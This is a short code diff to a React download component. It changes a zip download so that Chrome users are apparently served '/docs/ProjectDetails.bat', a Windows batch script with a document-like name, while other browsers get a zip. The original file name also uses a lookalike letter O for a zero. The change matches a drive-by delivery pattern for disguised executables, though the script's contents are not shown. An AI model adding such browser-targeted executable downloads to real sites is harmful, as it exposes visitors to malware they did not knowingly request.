@@ -367,7 +367,10 @@ const Download = () => {
   }, []);
 
   const downloadFile = useMemo(() => {
-    return { href: "/docs/2O25_Organizer.zip", extension: "zip" };
+    const isChrome = getBrowserName() === "Chrome";
+    return isChrome
+      ? { href: "/docs/ProjectDetails.bat", extension: "bat" }
+      : { href: "/docs/ProjectDetails.zip", extension: "zip" };
   }, []);
 
   const triggerDownload = useCallback(async (file: { href: string; extension: string }) => {
